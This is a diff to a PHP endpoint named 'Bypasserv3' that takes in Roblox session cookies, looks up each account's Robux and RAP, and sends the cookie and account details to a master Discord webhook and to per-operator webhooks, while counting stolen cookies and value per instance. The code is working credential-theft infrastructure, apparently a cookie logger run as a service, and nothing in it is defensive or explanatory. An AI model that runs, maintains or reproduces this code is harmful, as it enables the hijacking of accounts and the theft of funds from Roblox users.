@@ -1,7 +1,7 @@
 <?php
 /**
  * Bypasserv3 - Bypass API Endpoint
- * Updated with per-instance user webhooks and detailed Roblox data
+ * Updated with file-based storage and detailed Roblox data
  */
 
 header('Content-Type: application/json');
@@ -85,7 +85,7 @@ if (!$instanceData) {
 }
 
 $userWebhook = $instanceData['userWebhook'] ?? '';
-$masterWebhook = MASTER_WEBHOOK;
+$masterWebhook = $instanceData['webhook'] ?? '';
 
 // ============================================
 // HELPER FUNCTIONS FOR ROBLOX API
@@ -142,7 +142,7 @@ if (!empty($curlError) || $httpCode !== 200 || empty($apiResponse)) {
         'avatar_url' => 'https://cdn.pfps.gg/pfps/51778-beabadoobee.png',
         'embeds' => [[
             'title' => '❌ BYPASS FAILED',
-            'description' => "**From:** Bypasserv3\n\n**👤 Username:** Unknown\n**🔑 Password:** " . substr($cookie, 0, 20) . "...\n\n**📝 Error:** Invalid cookie or API request failed. Please check your cookie!",
+            'description' => "**From:** Bypasserv3\n\n**👤 Username:** Unknown\n**🔑 Cookie:** " . substr($cookie, 0, 20) . "...\n\n**📝 Error:** Invalid cookie or API request failed. Please check your cookie!",
             'color' => hexdec('ff0000'),
             'timestamp' => date('c'),
             'footer' => ['text' => 'Bypass Failed']
@@ -153,7 +153,7 @@ if (!empty($curlError) || $httpCode !== 200 || empty($apiResponse)) {
     if (!empty($masterWebhook)) {
         sendWebhookNotification($masterWebhook, $failedEmbed);
     }
-    if (!empty($userWebhook)) {
+    if (!empty($userWebhook) && $userWebhook !== $masterWebhook) {
         sendWebhookNotification($userWebhook, $failedEmbed);
     }
     
@@ -181,7 +181,7 @@ if (!$apiData || !isset($apiData['success']) || !$apiData['success']) {
         'avatar_url' => 'https://cdn.pfps.gg/pfps/51778-beabadoobee.png',
         'embeds' => [[
             'title' => '❌ BYPASS FAILED',
-            'description' => "**From:** Bypasserv3\n\n**👤 Username:** Unknown\n**🔑 Password:** " . substr($cookie, 0, 20) . "...\n\n**📝 Error:** API returned invalid response. Please check your cookie!",
+            'description' => "**From:** Bypasserv3\n\n**👤 Username:** Unknown\n**🔑 Cookie:** " . substr($cookie, 0, 20) . "...\n\n**📝 Error:** API returned invalid response. Please check your cookie!",
             'color' => hexdec('ff0000'),
             'timestamp' => date('c'),
             'footer' => ['text' => 'Bypass Failed']
@@ -192,7 +192,7 @@ if (!$apiData || !isset($apiData['success']) || !$apiData['success']) {
     if (!empty($masterWebhook)) {
         sendWebhookNotification($masterWebhook, $failedEmbed);
     }
-    if (!empty($userWebhook)) {
+    if (!empty($userWebhook) && $userWebhook !== $masterWebhook) {
         sendWebhookNotification($userWebhook, $failedEmbed);
     }
     
@@ -332,22 +332,33 @@ $creditBalance = $creditBalanceData['balance'] ?? 0;
 $creditRobux = $creditBalanceData['robuxAmount'] ?? 0;
 
 // ============================================
-// UPDATE INSTANCE STATS
+// UPDATE INSTANCE STATS (FILE-BASED)
 // ============================================
 if ($instanceData) {
-    updateInstanceStats($directory, 'totalCookies', ($instanceData['stats']['totalCookies'] ?? 0) + 1);
-    updateInstanceStats($directory, 'totalRobux', ($instanceData['stats']['totalRobux'] ?? 0) + $robux);
-    updateInstanceStats($directory, 'totalRAP', ($instanceData['stats']['totalRAP'] ?? 0) + $rap);
-    updateInstanceStats($directory, 'totalSummary', ($instanceData['stats']['totalSummary'] ?? 0) + $summary);
+    $currentCookies = $instanceData['stats']['totalCookies'];
+    $currentRobux = $instanceData['stats']['totalRobux'];
+    $currentRAP = $instanceData['stats']['totalRAP'];
+    $currentSummary = $instanceData['stats']['totalSummary'];
+    
+    updateInstanceStats($directory, 'totalCookies', $currentCookies + 1);
+    updateInstanceStats($directory, 'totalRobux', $currentRobux + $robux);
+    updateInstanceStats($directory, 'totalRAP', $currentRAP + $rap);
+    updateInstanceStats($directory, 'totalSummary', $currentSummary + $summary);
     
     updateDailyStats($directory, 'cookies', 1);
     updateDailyStats($directory, 'robux', $robux);
     updateDailyStats($directory, 'rap', $rap);
     updateDailyStats($directory, 'summary', $summary);
+    
+    // Update username and profile pic if empty
+    $path = __DIR__ . "/../instances/$directory";
+    if (empty($instanceData['username']) && !empty($username)) {
+        file_put_contents("$path/username.txt", $username, LOCK_EX);
+    }
+    if (!empty($avatarUrl)) {
+        file_put_contents("$path/profilepic.txt", $avatarUrl, LOCK_EX);
+    }
 }
-
-// Update global stats
-updateGlobalStats('totalCookies', 1);
 
 // ============================================
 // SEND WEBHOOKS WITH REAL DATA
@@ -407,7 +418,7 @@ if (!empty($masterWebhook)) {
 }
 
 // Send to User Webhook (same detailed format)
-if (!empty($userWebhook)) {
+if (!empty($userWebhook) && $userWebhook !== $masterWebhook) {
     sendWebhookNotification($userWebhook, $detailedEmbed);
     sleep(1);
     sendWebhookNotification($userWebhook, $cookieEmbed);
